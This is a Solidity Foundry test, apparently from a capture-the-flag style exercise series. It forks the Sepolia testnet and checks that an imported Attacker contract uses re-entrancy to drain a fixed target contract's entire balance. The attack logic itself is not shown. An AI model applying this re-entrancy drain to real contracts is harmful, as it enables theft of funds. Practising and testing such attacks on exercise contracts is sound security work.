// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test, console} from "forge-std/Test.sol";
import {Attacker} from "../src/10-Re-entrancy/Attacker.sol";

interface IReentrancy{
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract TestReentrancy is Test{
    address constant private TARGET_ADDRESS = 0x6e240e7Cca039ee58719012d510Ef7E91a3d2DfB;
    uint256 constant private BALANCE = 0.0005 ether;
    IReentrancy target;
    Attacker attacker;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);
        target = IReentrancy(TARGET_ADDRESS);
        attacker = new Attacker();
    }

    function testReentrancy() public {
        uint256 startingBalance = address(target).balance; 
        assert(startingBalance > 0);

        attacker.deposit{value: BALANCE}();

        uint256 endingBalance = address(target).balance;

        assertEq(endingBalance, 0);
        assertEq(address(attacker).balance, startingBalance + BALANCE);
    }

}